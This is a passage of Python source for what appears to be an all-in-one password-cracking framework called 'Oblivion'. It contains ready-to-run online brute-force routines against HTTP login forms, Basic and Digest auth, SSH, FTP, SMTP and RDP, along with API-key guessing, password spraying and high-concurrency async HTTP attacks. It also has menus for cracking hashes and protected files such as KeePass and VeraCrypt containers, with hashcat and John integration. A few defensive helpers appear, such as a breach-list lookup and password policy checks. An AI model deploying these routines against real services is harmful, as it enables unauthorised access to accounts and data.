    return {
        'total': len(wordlist),
        'unique': len(set(wordlist)),
        'min_len': min(lengths) if lengths else 0,
        'max_len': max(lengths) if lengths else 0,
        'avg_len': sum(lengths)/len(lengths) if lengths else 0,
        'char_freq': chars.most_common(10)
    }

def generate_hashcat_rules(wordlist, output_file='oblivion.rule', max_rules=100):
    base_rules = [':', 'u', 'c', 'r', 'd', 'l', 't', 'T', 'U',
                  'sa4', 'se3', 'si1', 'so0', 'ss5', 'st7', 'sb8', 'sg9',
                  'au', 'ac', 'ar', 'ad', 'al']
    with open(output_file, 'w') as f:
        for rule in base_rules[:max_rules]:
            f.write(rule + '\n')

# ---------- Markov Generator ----------
class MarkovGenerator:
    def __init__(self):
        self.transitions = defaultdict(lambda: defaultdict(int))
        self.start_chars = defaultdict(int)
        self.total = 0
    def train(self, wordlist):
        for word in wordlist:
            if not word:
                continue
            self.start_chars[word[0]] += 1
            self.total += 1
            for i in range(len(word)-1):
                self.transitions[word[i]][word[i+1]] += 1
            self.transitions[word[-1]][' '] += 1
    def generate(self, max_len=12, num=10):
        results = []
        for _ in range(num):
            word = []
            chars = list(self.start_chars.keys())
            if not chars:
                return []
            weights = [self.start_chars[c] / self.total for c in chars] if self.total else []
            current = random.choices(chars, weights=weights)[0] if self.total else random.choice(chars)
            word.append(current)
            while len(word) < max_len:
                next_chars = list(self.transitions[current].keys())
                if not next_chars:
                    break
                weights = [self.transitions[current][c] / sum(self.transitions[current].values()) for c in next_chars]
                current = random.choices(next_chars, weights=weights)[0]
                if current == ' ':
                    break
                word.append(current)
            results.append(''.join(word))
        return results

# ---------- Online Attack Helpers ----------
def http_login_bruteforce(url, username, wordlist, password_field='password',
                          username_field='username', extra_data=None,
                          success_string=None, success_code=200,
                          check_redirect=True, verify_ssl=True,
                          timeout=10, headers=None, proxies=None,
                          delay=1, session=None, auth_type='form',
                          auth_username=None, auth_password=None):
    if not HAS_REQUESTS:
        logging.error("requests not installed")
        return None
    if session is None:
        session = requests.Session()
    session.verify = verify_ssl
    if headers:
        session.headers.update(headers)
    if proxies:
        session.proxies.update(proxies)
    for pwd in wordlist:
        if auth_type == 'form':
            data = {username_field: username, password_field: pwd}
            if extra_data:
                data.update(extra_data)
            try:
                resp = session.post(url, data=data, timeout=timeout, allow_redirects=True)
                success = False
                if success_string and success_string in resp.text:
                    success = True
                elif resp.status_code == success_code:
                    success = True
                elif check_redirect and resp.url != url and 'login' not in resp.url.lower():
                    success = True
                if success:
                    return pwd
            except Exception as e:
                logging.debug(f"HTTP request failed: {e}")
        else:
            try:
                auth = HTTPBasicAuth(auth_username, pwd) if auth_type == 'basic' else HTTPDigestAuth(auth_username, pwd)
                resp = session.get(url, auth=auth, timeout=timeout, allow_redirects=True)
                if resp.status_code == 200:
                    if success_string and success_string in resp.text:
                        return pwd
                    elif not success_string:
                        return pwd
            except Exception as e:
                logging.debug(f"HTTP auth failed: {e}")
        time.sleep(delay)
    return None

def ssh_bruteforce(host, username, wordlist, port=22, key_file=None, timeout=5):
    if not HAS_PARAMIKO:
        logging.error("paramiko not installed")
        return None
    for pwd in wordlist:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            if key_file:
                pkey = paramiko.RSAKey.from_private_key_file(key_file, password=pwd)
                ssh.connect(host, port=port, username=username, pkey=pkey, timeout=timeout)
            else:
                ssh.connect(host, port=port, username=username, password=pwd, timeout=timeout)
            ssh.close()
            return pwd
        except Exception:
            continue
    return None

def ftp_bruteforce(host, username, wordlist, port=21, timeout=5):
    import ftplib
    for pwd in wordlist:
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=timeout)
            ftp.login(username, pwd)
            ftp.quit()
            return pwd
        except Exception:
            continue
    return None

def smtp_bruteforce(host, username, wordlist, port=25, timeout=5, use_ssl=False):
    import smtplib
    for pwd in wordlist:
        try:
            if use_ssl:
                server = smtplib.SMTP_SSL(host, port, timeout=timeout)
            else:
                server = smtplib.SMTP(host, port, timeout=timeout)
            server.starttls()
            server.login(username, pwd)
            server.quit()
            return pwd
        except Exception:
            continue
    return None

def rdp_bruteforce(host, username, wordlist, port=3389):
    if not check_dependency('xfreerdp'):
        print(c("xfreerdp not found. Install freerdp.", C.WARN))
        return None
    for pwd in wordlist:
        cmd = ['xfreerdp', '/v:' + host + ':' + str(port), '/u:' + username, '/p:' + pwd, '/cert-ignore', '+auth-only']
        try:
            subprocess.run(cmd, timeout=10, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            return pwd
        except Exception:
            continue
    return None

def mysql_login(host, username, password, port=3306):
    try:
        import pymysql
        conn = pymysql.connect(host=host, port=port, user=username,
                               password=password, connect_timeout=5)
        conn.close()
        return True
    except Exception:
        return False

def postgres_login(host, username, password, port=5432):
    try:
        import psycopg2
        conn = psycopg2.connect(host=host, port=port, user=username,
                                password=password, connect_timeout=5)
        conn.close()
        return True
    except Exception:
        return False

def snmp_check(host, community, port=161):
    try:
        import pysnmp.hlapi as snmp
        errorIndication, errorStatus, errorIndex, varBinds = next(
            snmp.getCmd(snmp.SnmpEngine(),
                        snmp.CommunityData(community),
                        snmp.UdpTransportTarget((host, port)),
                        snmp.ContextData(),
                        snmp.ObjectType(snmp.ObjectIdentity('1.3.6.1.2.1.1.1.0')))
        )
        if errorIndication or errorStatus:
            return False
        return True
    except Exception:
        return False

def webdav_login(url, username, password):
    if not HAS_REQUESTS:
        return False
    try:
        resp = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=10)
        return resp.status_code == 200
    except Exception:
        return False

def api_key_bruteforce(url, key_list):
    if not HAS_REQUESTS:
        return None
    for key in key_list:
        headers = {'Authorization': f'Bearer {key}'}
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                return key
        except Exception:
            continue
    return None

def check_hibp(password):
    import hashlib
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix = sha1[:5]
    suffix = sha1[5:]
    try:
        resp = requests.get(f'https://api.pwnedpasswords.com/range/{prefix}')
        if resp.status_code == 200:
            for line in resp.text.splitlines():
                if line.startswith(suffix):
                    count = int(line.split(':')[1])
                    return count
        return 0
    except Exception:
        return -1

def enforce_policy(password, min_len=8, require_upper=True, require_lower=True,
                   require_digit=True, require_special=True):
    errors = []
    if len(password) < min_len:
        errors.append(f"Minimum length {min_len}")
    if require_upper and not any(c.isupper() for c in password):
        errors.append("No uppercase letters")
    if require_lower and not any(c.islower() for c in password):
        errors.append("No lowercase letters")
    if require_digit and not any(c.isdigit() for c in password):
        errors.append("No digits")
    if require_special and not any(c in string.punctuation for c in password):
        errors.append("No special characters")
    return errors

def suggest_stronger(password):
    if len(password) < 12:
        return "Make it at least 12 characters, use a passphrase like 'correct horse battery staple'"
    if not any(c in string.punctuation for c in password):
        return "Add at least one special character"
    if not any(c.isupper() for c in password):
        return "Add uppercase letters"
    return "Password is already strong, but consider using a password manager."

def password_spray(usernames, wordlist, login_function, delay=1):
    results = {}
    for pwd in wordlist[:20]:
        for user in usernames:
            try:
                if login_function(user, pwd):
                    results[user] = pwd
            except Exception:
                continue
            time.sleep(delay)
    return results

# ---------- Async HTTP ----------
async def async_http_check(url, username, password, session, success_string=None):
    data = {'username': username, 'password': password}
    try:
        async with session.post(url, data=data) as resp:
            text = await resp.text()
            if success_string and success_string in text:
                return password
            elif resp.status == 200 and 'login' not in resp.url.path:
                return password
    except Exception:
        pass
    return None

async def async_http_bruteforce(url, username, wordlist, success_string=None,
                               concurrency=50, delay=0.1):
    if not HAS_AIOHTTP:
        print(c("aiohttp not installed", C.ERROR))
        return None
    connector = aiohttp.TCPConnector(limit=concurrency)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for pwd in wordlist:
            tasks.append(async_http_check(url, username, pwd, session, success_string))
            await asyncio.sleep(delay)
        for coro in asyncio.as_completed(tasks):
            result = await coro
            if result:
                return result
    return None

# ---------- Plugin Loader ----------
class Plugin:
    """Base class for plugins. Plugins must subclass this and implement `run`."""
    def run(self, args):
        raise NotImplementedError

ALLOWED_PLUGIN_MODULES = {
    'json', 're', 'string', 'collections', 'itertools', 'math', 'time', 'datetime', 'random'
}

def load_plugins(plugin_dir='plugins', safe_mode=True):
    """Load plugins with sandboxing if safe_mode=True."""
    plugins = []
    if not os.path.isdir(plugin_dir):
        return plugins
    for f in os.listdir(plugin_dir):
        if f.endswith('.py') and not f.startswith('_'):
            filepath = os.path.join(plugin_dir, f)
            module_name = f[:-3]
            try:
                with open(filepath, 'r') as src:
                    code = src.read()
                if safe_mode:
                    restricted_globals = {
                        '__builtins__': {
                            'print': print,
                            'len': len,
                            'range': range,
                            'int': int,
                            'str': str,
                            'float': float,
                            'list': list,
                            'dict': dict,
                            'set': set,
                            'tuple': tuple,
                            'bool': bool,
                            'enumerate': enumerate,
                            'zip': zip,
                            'reversed': reversed,
                            'sorted': sorted,
                            'sum': sum,
                            'min': min,
                            'max': max,
                            'abs': abs,
                            'any': any,
                            'all': all,
                            'eval': None,
                            'exec': None,
                            'compile': None,
                            '__import__': None,
                            'open': None,
                        },
                        **{mod: __import__(mod) for mod in ALLOWED_PLUGIN_MODULES}
                    }
                    restricted_globals['Plugin'] = Plugin
                    exec_globals = {'__name__': module_name}
                    exec(code, restricted_globals, exec_globals)
                    for obj in exec_globals.values():
                        if isinstance(obj, type) and issubclass(obj, Plugin) and obj is not Plugin:
                            plugin_instance = obj()
                            plugins.append(plugin_instance)
                            break
                else:
                    spec = importlib.util.spec_from_file_location(module_name, filepath)
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)
                    plugins.append(module)
            except Exception as e:
                logging.error(f"Failed to load plugin {f}: {e}")
    return plugins

# ---------- REST API ----------
API_KEY = os.getenv("OBLIVION_API_KEY")
if not API_KEY:
    API_KEY = secrets.token_hex(16)
    logging.warning("No API key set in environment. Generated temporary key: %s", API_KEY)
    print(c(f"WARNING: Generated temporary API key: {API_KEY}", C.WARN))

def start_rest_api(host='127.0.0.1', port=5000):
    if not HAS_FLASK:
        print(c("Flask not installed", C.ERROR))
        return
    app = Flask(__name__)

    if HAS_LIMITER:
        limiter = Limiter(
            app,
            key_func=get_remote_address,
            default_limits=["100 per minute"]
        )
    else:
        limiter = None

    def require_api_key(f):
        def wrapper(*args, **kwargs):
            key = request.headers.get('X-API-Key')
            if key != API_KEY:
                return jsonify({'error': 'Unauthorized'}), 401
            return f(*args, **kwargs)
        wrapper.__name__ = f.__name__
        return wrapper

    @app.route('/crack/hash', methods=['POST'])
    @require_api_key
    def crack_hash():
        data = request.json
        if not data or 'target' not in data:
            return jsonify({'error': 'Missing target hash'}), 400
        target = data['target']
        wordlist = data.get('wordlist', [])
        if len(wordlist) > 100000:
            return jsonify({'error': 'Wordlist too large (max 100,000)'}), 400
        algo = data.get('algo', detect_hash_algo(target))
        salt = data.get('salt', None)
        mutate = data.get('mutate', False)
        max_workers = data.get('max_workers', get_optimal_workers())
        if max_workers > 8:
            max_workers = 8
        try:
            result, attempts = dictionary_attack_parallel(
                target, wordlist, algo, salt, mutate, max_workers
            )
            return jsonify({'password': result, 'attempts': attempts})
        except Exception as e:
            logging.error(f"API crack_hash error: {e}")
            return jsonify({'error': str(e)}), 500

    @app.route('/shutdown', methods=['POST'])
    @require_api_key
    def shutdown():
        func = request.environ.get('werkzeug.server.shutdown')
        if func is None:
            return jsonify({'error': 'Server not running with Werkzeug'}), 500
        func()
        return jsonify({'message': 'Shutting down...'})

    @app.route('/status', methods=['GET'])
    def status():
        return jsonify({'status': 'running'})

    app.run(host=host, port=port, debug=False, threaded=True)

def menu_rest_api():
    global api_process
    print(c("\n--- REST API ---", C.INFO))
    if not HAS_FLASK:
        print(c("Flask not installed. Install with: pip install flask flask-limiter", C.ERROR))
        return

    if api_process is not None and api_process.is_alive():
        print(c("API is currently running on http://localhost:5000", C.INFO))
        print(c(f"API Key: {API_KEY}", C.CYAN))
        stop = input("Stop it? (y/n) [n]: ").strip().lower()
        if stop == 'y':
            try:
                import requests
                resp = requests.post('http://localhost:5000/shutdown',
                                     headers={'X-API-Key': API_KEY}, timeout=2)
                if resp.status_code == 200:
                    print(c("Shutdown signal sent.", C.SUCCESS))
                else:
                    print(c("Shutdown failed, terminating process.", C.WARN))
                    api_process.terminate()
            except Exception:
                print(c("Could not reach API, terminating process.", C.WARN))
                api_process.terminate()
            api_process.join(timeout=2)
            if api_process.is_alive():
                api_process.kill()
            api_process = None
            print(c("API stopped.", C.SUCCESS))
        else:
            print(c("API remains running.", C.INFO))
        return

    host = input("Host [127.0.0.1]: ").strip() or '127.0.0.1'
    port = int(input("Port [5000]: ").strip() or 5000)
    try:
        api_process = multiprocessing.Process(
            target=start_rest_api,
            args=(host, port),
            daemon=False
        )
        api_process.start()
        print(c(f"API started on http://{host}:{port}", C.SUCCESS))
        print(c(f"API Key: {API_KEY}", C.CYAN))
        print(c("Use option 25 again to stop the server.", C.INFO))
    except Exception as e:
        print(c(f"Failed to start API: {e}", C.ERROR))
        api_process = None

# ---------- CLI Parser ----------
def parse_args():
    parser = argparse.ArgumentParser(description='Oblivion Password Cracking Framework')
    parser.add_argument('--hash', help='Target hash to crack')
    parser.add_argument('--wordlist', help='Path to wordlist')
    parser.add_argument('--algo', default='auto', help='Hash algorithm (auto-detect if not specified)')
    parser.add_argument('--mutate', action='store_true', help='Apply rule mutations')
    parser.add_argument('--bruteforce', action='store_true', help='Use brute-force instead of dictionary')
    parser.add_argument('--max-len', type=int, default=4, help='Max length for brute-force')
    parser.add_argument('--charset', default='a-zA-Z0-9', help='Charset for brute-force')
    parser.add_argument('--batch', help='Batch config JSON file')
    parser.add_argument('--file', help='File to crack')
    parser.add_argument('--file-type', default='zip', help='File type')
    parser.add_argument('--output', help='Output report file')
    parser.add_argument('--hashcat', action='store_true', help='Generate Hashcat command')
    parser.add_argument('--safe-plugins', action='store_true', default=True,
                        help='Enable plugin sandboxing (default: True)')
    return parser.parse_args()

# ---------- Menu Functions ----------
def menu_generate_hash():
    print(c("\n--- Generate Hash ---", C.INFO))
    password = input("Enter password: ").strip()
    if not password:
        print(c("No password.", C.ERROR)); return
    algo = input("Algo (md5,sha1,sha256,sha512,ntlm,bcrypt,postgres,mysql,apr1) [sha256]: ").strip() or 'sha256'
    if algo == 'bcrypt' and not HAS_BCRYPT:
        print(c("bcrypt not installed.", C.ERROR)); return
    salt = None
    if algo in ('sha1_salt', 'postgres'):
        salt = input("Enter salt: ").strip() or None
    try:
        h = hash_password(password, algo, salt) if salt else hash_password(password, algo)
        print(c(f"Hash: {h}", C.SUCCESS))
    except Exception as e:
        print(c(f"Error: {e}", C.ERROR))

def menu_dictionary_attack():
    global cracking_results
    print(c("\n--- Dictionary Attack ---", C.INFO))
    target = input("Target hash: ").strip()
    if not target:
        print(c("No hash.", C.ERROR)); return
    algo = detect_hash_algo(target)
    algo = input(f"Algo [{algo}]: ").strip() or algo
    salt = None
    if ':' in target and algo in ('sha1_salt', 'postgres'):
        salt, target = target.split(':', 1)
    wl_path = input("Wordlist path: ").strip()
    mutate = input("Apply rules? (y/n) [n]: ").strip().lower() == 'y'
    threads = int(input("Threads (default auto): ").strip() or 0) or get_optimal_workers()
    print(c("Starting attack...", C.INFO))
    start = time.time()
    wordlist = wl_path if os.path.isfile(wl_path) else read_wordlist(wl_path) or ["password", "123456", "admin"]
    found, attempts = dictionary_attack_parallel(target, wordlist, algo, salt, mutate, max_workers=threads)
    elapsed = time.time() - start
    if found:
        print(c(f"[SUCCESS] Password: {found}", C.SUCCESS))
        print(f"Attempts: {attempts}, Time: {elapsed:.2f}s")
        cracking_results.append({'target': target, 'password': found, 'attempts': attempts, 'time': elapsed, 'algo': algo})
        save_results()
    else:
        print(c("[FAILED] Not found.", C.ERROR))

def menu_bruteforce_attack():
    global cracking_results
    print(c("\n--- Brute-Force Attack ---", C.INFO))
    target = input("Target hash: ").strip()
    if not target:
        print(c("No hash.", C.ERROR)); return
    algo = detect_hash_algo(target)
    algo = input(f"Algo [{algo}]: ").strip() or algo
    salt = None
    if ':' in target and algo in ('sha1_salt', 'postgres'):
        salt, target = target.split(':', 1)
    max_len = int(input("Max length (default 4): ").strip() or 4)
    charset_input = input("Charset (default a-zA-Z0-9, or 'custom'): ").strip()
    if charset_input == 'custom':
        charset = input("Custom characters: ").strip() or ascii_lowercase + ascii_uppercase + digits
    else:
        charset = ascii_lowercase + ascii_uppercase + digits
    print(c("Starting brute-force...", C.INFO))
    start = time.time()
    found, attempts = brute_force_attack(target, algo, salt, max_len, charset)
    elapsed = time.time() - start
    if found:
        print(c(f"[SUCCESS] Password: {found}", C.SUCCESS))
        print(f"Attempts: {attempts}, Time: {elapsed:.2f}s")
        cracking_results.append({'target': target, 'password': found, 'attempts': attempts, 'time': elapsed, 'algo': algo})
        save_results()
    else:
        print(c("[FAILED] Not found.", C.ERROR))

def menu_crack_file():
    global cracking_results
    print(c("\n--- Crack Password-Protected File ---", C.INFO))
    file_path = input("File path: ").strip()
    if not os.path.isfile(file_path):
        print(c("File not found.", C.ERROR)); return
    ext = os.path.splitext(file_path)[1].lower()
    ext_map = {'.zip':'zip','.7z':'7z','.rar':'rar','.pdf':'pdf',
               '.docx':'office','.xlsx':'office','.pptx':'office',
               '.gpg':'gpg','.kdbx':'keepass','.ssh':'ssh',
               '.tc':'veracrypt','.vc':'veracrypt','.p12':'pkcs12','.pem':'pem'}
    default_type = ext_map.get(ext, 'zip')
    file_type = input(f"File type (default {default_type}): ").strip() or default_type
    if file_type not in FILE_VERIFIERS:
        print(c("Unsupported type.", C.ERROR)); return
    wl_path = input("Wordlist path: ").strip()
    wordlist = read_wordlist(wl_path) if wl_path else ["password", "123456", "admin"]
    mutate = input("Apply rules? (y/n) [n]: ").strip().lower() == 'y'
    print(c("Cracking file...", C.INFO))
    start = time.time()
    found = crack_file(file_path, wordlist, file_type, mutate)
    elapsed = time.time() - start
    if found:
        print(c(f"[SUCCESS] Password: {found}", C.SUCCESS))
        print(f"Time: {elapsed:.2f}s")
        cracking_results.append({'target': file_path, 'password': found, 'attempts': len(wordlist), 'time': elapsed, 'algo': 'file'})
        save_results()
    else:
        print(c("[FAILED] Not found.", C.ERROR))

def menu_online_bruteforce():
    global cracking_results
    print(c("\n--- Online Brute-Force ---", C.INFO))
    print("1. HTTP Form\n2. Basic Auth\n3. Digest Auth\n4. SSH\n5. FTP\n6. SMTP")
    proto = input("Choice [1]: ").strip() or '1'
    if proto == '1':
        url = input("Login URL: ").strip()
        username = input("Username: ").strip()
        wl_path = input("Wordlist path: ").strip()
        wordlist = read_wordlist(wl_path) if wl_path else ["password", "123456", "admin"]
        username_field = input("Username field [username]: ").strip() or 'username'
        password_field = input("Password field [password]: ").strip() or 'password'
        success_string = input("Success text (optional): ").strip() or None
        verify_ssl = input("Verify SSL? (y/n) [y]: ").strip().lower() != 'n'
        delay = float(input("Delay (seconds) [1]: ").strip() or 1)
        headers_input = input("Custom headers (JSON, optional): ").strip()
        headers = {}
        if headers_input:
            try:
                headers = json.loads(headers_input)
            except json.JSONDecodeError:
                print(c("Invalid JSON headers, ignoring.", C.WARN))
        proxy = input("Proxy (optional): ").strip()
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        found = http_login_bruteforce(url, username, wordlist, password_field,
                                      username_field, success_string=success_string,
                                      verify_ssl=verify_ssl, delay=delay,
                                      headers=headers, proxies=proxies)
        if found:
            print(c(f"[SUCCESS] Password: {found}", C.SUCCESS))
            cracking_results.append({'target': url, 'password': found, 'attempts': len(wordlist), 'time': 0, 'algo': 'http'})
            save_results()
        else:
            print(c("[FAILED] Not found.", C.ERROR))
    elif proto in ('2','3'):
        url = input("URL: ").strip()
        username = input("Username: ").strip()
        wl_path = input("Wordlist path: ").strip()
        wordlist = read_wordlist(wl_path) if wl_path else ["password", "123456", "admin"]
        success_string = input("Success text (optional): ").strip() or None
        verify_ssl = input("Verify SSL? (y/n) [y]: ").strip().lower() != 'n'
        delay = float(input("Delay (seconds) [1]: ").strip() or 1)
        auth_type = 'basic' if proto == '2' else 'digest'
        found = http_login_bruteforce(url, username, wordlist, auth_type=auth_type,
                                      auth_username=username, success_string=success_string,
                                      verify_ssl=verify_ssl, delay=delay)
        if found:
            print(c(f"[SUCCESS] Password: {found}", C.SUCCESS))
            cracking_results.append({'target': url, 'password': found, 'attempts': len(wordlist), 'time': 0, 'algo': auth_type})
            save_results()
        else:
            print(c("[FAILED] Not found.", C.ERROR))
    elif proto == '4':
        host = input("SSH host: ").strip()
        username = input("Username: ").strip()
        port = int(input("Port [22]: ").strip() or 22)
        key_file = input("Private key file (optional): ").strip() or None
        wl_path = input("Wordlist path: ").strip()
        wordlist = read_wordlist(wl_path) if wl_path else ["password", "123456", "admin"]
        if not HAS_PARAMIKO:
            print(c("paramiko not installed.", C.ERROR)); return
        found = ssh_bruteforce(host, username, wordlist, port, key_file)
        if found:
            print(c(f"[SUCCESS] Password: {found}", C.SUCCESS))
            cracking_results.append({'target': host, 'password': found, 'attempts': len(wordlist), 'time': 0, 'algo': 'ssh'})
            save_results()
        else:
            print(c("[FAILED] Not found.", C.ERROR))
    elif proto == '5':
        host = input("FTP host: ").strip()
        username = input("Username: ").strip()
        port = int(input("Port [21]: ").strip() or 21)
        wl_path = input("Wordlist path: ").strip()
        wordlist = read_wordlist(wl_path) if wl_path else ["password", "123456", "admin"]
        found = ftp_bruteforce(host, username, wordlist, port)
        if found:
            print(c(f"[SUCCESS] Password: {found}", C.SUCCESS))
            cracking_results.append({'target': host, 'password': found, 'attempts': len(wordlist), 'time': 0, 'algo': 'ftp'})
            save_results()
        else:
            print(c("[FAILED] Not found.", C.ERROR))
    elif proto == '6':
        host = input("SMTP host: ").strip()
        username = input("Username: ").strip()
        port = int(input("Port [25]: ").strip() or 25)
        use_ssl = input("Use SSL? (y/n) [n]: ").strip().lower() == 'y'
        wl_path = input("Wordlist path: ").strip()
        wordlist = read_wordlist(wl_path) if wl_path else ["password", "123456", "admin"]
        found = smtp_bruteforce(host, username, wordlist, port, use_ssl=use_ssl)
        if found:
            print(c(f"[SUCCESS] Password: {found}", C.SUCCESS))
            cracking_results.append({'target': host, 'password': found, 'attempts': len(wordlist), 'time': 0, 'algo': 'smtp'})
            save_results()
        else:
            print(c("[FAILED] Not found.", C.ERROR))

def menu_password_tools():
    print(c("\n--- Password Tools ---", C.INFO))
    print("1. Strength Analyser\n2. Generator")
    choice = input("Choice [1]: ").strip() or '1'
    if choice == '1':
        pwd = input("Enter password: ").strip()
        if not pwd: return
        stats = analyse_password(pwd)
        print(c(f"Length: {stats['length']}, Entropy: {stats['entropy']:.1f}, Score: {stats['score']}/100", C.INFO))
        if stats['warnings']:
            print(c("Warnings:", C.WARN))
            for w in stats['warnings']: print(f" - {w}")
    else:
        length = int(input("Length [16]: ").strip() or 16)
        use_upper = input("Uppercase? (y/n) [y]: ").strip().lower() != 'n'
        use_lower = input("Lowercase? (y/n) [y]: ").strip().lower() != 'n'
        use_digits = input("Digits? (y/n) [y]: ").strip().lower() != 'n'
        use_special = input("Special? (y/n) [y]: ").strip().lower() != 'n'
        pwd = generate_password(length, use_upper, use_lower, use_digits, use_special)
        print(c(f"Generated: {pwd}", C.SUCCESS))

def menu_wordlist_tools():
    print(c("\n--- Wordlist Tools ---", C.INFO))
    print("1. Profile\n2. Merge\n3. Filter\n4. Generate Hashcat rules")
    choice = input("Choice [1]: ").strip() or '1'
    if choice == '1':
        path = input("Wordlist path: ").strip()
        if not os.path.isfile(path): return
        wl = read_wordlist(path)
        if not wl: return
        stats = profile_wordlist(wl)
        print(c("Profile:", C.INFO))
        for k,v in stats.items():
            print(f"{k}: {v}")
    elif choice == '2':
        paths = input("Comma-separated wordlist paths: ").strip().split(',')
        merged = []
        for p in paths:
            wl = read_wordlist(p.strip()) or []
            merged.extend(wl)
        merged = sorted(set(merged))
        out = input("Output file: ").strip()
        if out:
            with open(out, 'w') as f:
                f.write('\n'.join(merged))
            print(c(f"Merged wordlist saved to {out}", C.SUCCESS))
    elif choice == '3':
        path = input("Wordlist path: ").strip()
        if not os.path.isfile(path): return
        wl = read_wordlist(path)
        min_len = int(input("Min length (0): ").strip() or 0)
        max_len = int(input("Max length (999): ").strip() or 999)
        filtered = [w for w in wl if min_len <= len(w) <= max_len]
        out = input("Output file: ").strip()
        if out:
            with open(out, 'w') as f:
                f.write('\n'.join(filtered))
            print(c(f"Filtered wordlist saved to {out}", C.SUCCESS))
    elif choice == '4':
        path = input("Wordlist path: ").strip()
        if not os.path.isfile(path): return
        wl = read_wordlist(path)
        out = input("Output rule file [oblivion.rule]: ").strip() or 'oblivion.rule'
        generate_hashcat_rules(wl, out)
        print(c(f"Rules saved to {out}", C.SUCCESS))

def menu_hashcat_integration():
    print(c("\n--- Hashcat Integration ---", C.INFO))
    print("1. Generate command\n2. Run attack\n3. Benchmark\n4. Parse output")
    subchoice = input("Choice [1]: ").strip() or '1'
    if subchoice == '1':
        target = input("Target hash: ").strip()
        if not target: return
        algo = detect_hash_algo(target)
        algo = input(f"Algo [{algo}]: ").strip() or algo
        wl_path = input("Wordlist path (optional): ").strip()
        brute_mask = input("Brute mask (optional, e.g. ?a?a?a): ").strip()
        if not wl_path and not brute_mask:
            print(c("Either wordlist or brute mask required.", C.ERROR)); return
        rules = input("Rules file (optional): ").strip()
        output = input("Output file [hashcat_output.txt]: ").strip() or 'hashcat_output.txt'
        try:
            cmd = generate_hashcat_command(target, algo, wl_path, brute_mask, rules, output)
            print(c(f"Command: {' '.join(cmd)}", C.CYAN))
        except Exception as e:
            print(c(f"Error: {e}", C.ERROR))
    elif subchoice == '2':
        target = input("Target hash: ").strip()
        if not target: return
        algo = detect_hash_algo(target)
        algo = input(f"Algo [{algo}]: ").strip() or algo
        wl_path = input("Wordlist path (optional): ").strip()
        brute_mask = input("Brute mask (optional): ").strip()
        if not wl_path and not brute_mask:
            print(c("Either wordlist or brute mask required.", C.ERROR)); return
        rules = input("Rules file (optional): ").strip()
        output = input("Output file [hashcat_output.txt]: ").strip() or 'hashcat_output.txt'
        if run_hashcat(target, algo, wl_path, brute_mask, rules, output):
            print(c("Hashcat finished successfully.", C.SUCCESS))
            parsed = parse_hashcat_output(output)
            if parsed:
                print(c("Found passwords:", C.SUCCESS))
                for h, p in parsed.items():
                    print(f"{h}: {p}")
        else:
            print(c("Hashcat failed.", C.ERROR))
    elif subchoice == '3':
        algo = input("Algorithm to benchmark: ").strip() or 'sha256'
        result = hashcat_benchmark(algo)
        print(result)
    elif subchoice == '4':
        output = input("Output file [hashcat_output.txt]: ").strip() or 'hashcat_output.txt'
        parsed = parse_hashcat_output(output)
        if parsed:
            for h, p in parsed.items():
                print(f"{h}: {p}")
        else:
            print(c("No results found.", C.WARN))

def menu_batch():
    global cracking_results
    print(c("\n--- Batch Mode ---", C.INFO))
    config = input("Batch config JSON file: ").strip()
    if not os.path.isfile(config):
        print(c("File not found.", C.ERROR)); return
    results = run_batch(config)
    cracking_results.extend(results)
    save_results()
    print(c(f"Batch completed with {len(results)} jobs.", C.INFO))
    for r in results:
        print(f"{r['target']} -> {r['password'] if r['password'] else 'FAILED'}")

def menu_export():
    print(c("\n--- Export to Hashcat/John ---", C.INFO))
    target = input("Target hash: ").strip()
    if not target: return
    algo = detect_hash_algo(target)
    algo = input(f"Algo [{algo}]: ").strip() or algo
    wl_path = input("Wordlist path: ").strip()
    if not os.path.isfile(wl_path):
        print(c("Wordlist not found.", C.ERROR)); return
    try:
        cmd = generate_hashcat_command(target, algo, wl_path)
        print(c(f"Hashcat command:\n{' '.join(cmd)}", C.CYAN))
    except Exception as e:
        print(c(f"Error: {e}", C.ERROR))
        return
    hash_file = "oblivion.hash"
    with open(hash_file, 'w') as f:
        f.write(target + '\n')
    print(c(f"Hash saved to {hash_file} for John.", C.SUCCESS))
    john_format = {
        'md5': 'raw-md5', 'sha1': 'raw-sha1', 'sha256': 'raw-sha256',
        'sha512': 'raw-sha512', 'ntlm': 'ntlm', 'bcrypt': 'bcrypt'
    }.get(algo, 'raw-md5')
    print(c(f"John command: john --format={john_format} --wordlist={wl_path} {hash_file}", C.CYAN))

def menu_session():
    print(c("\n--- Session Management ---", C.INFO))
    chk = load_checkpoint()
    if chk:
        print(f"Last target: {chk.get('target')}, attempts: {chk.get('attempts', 0)}")
        if input("Clear checkpoint? (y/n) [n]: ").strip().lower() == 'y':
            clear_checkpoint()
            print(c("Checkpoint cleared.", C.SUCCESS))
    else:
        print("No checkpoint found.")

def menu_reporting():
    global cracking_results
    print(c("\n--- Reporting ---", C.INFO))
    if not cracking_results:
        print(c("No results yet. Run some attacks first.", C.WARN))
        return
    save_report()
    save_report_csv()
    save_report_markdown()
    generate_html_report()
    print(c("Reports saved: JSON, CSV, Markdown, and HTML (with chart).", C.SUCCESS))

def menu_password_spraying():
    print(c("\n--- Password Spraying ---", C.INFO))
    users = input("Comma-separated usernames: ").strip().split(',')
    users = [u.strip() for u in users if u.strip()]
    if not users: return
    def dummy_login(user, pwd):
        return user == 'admin' and pwd == 'admin'
    wordlist = ["password", "123456", "admin", "letmein", "qwerty", "welcome"]
    results = password_spray(users, wordlist, dummy_login)
    if results:
        print(c("Found credentials:", C.SUCCESS))
        for u, p in results.items():
            print(f"{u}: {p}")
    else:
        print(c("No credentials found.", C.ERROR))

def menu_markov_generator():
    print(c("\n--- Markov Password Generator ---", C.INFO))
    path = input("Training wordlist path: ").strip()
    if not os.path.isfile(path): return
    wl = read_wordlist(path)
    if not wl: return
    gen = MarkovGenerator()
    gen.train(wl)
    num = int(input("Number to generate [10]: ").strip() or 10)
    max_len = int(input("Max length [12]: ").strip() or 12)
    generated = gen.generate(max_len, num)
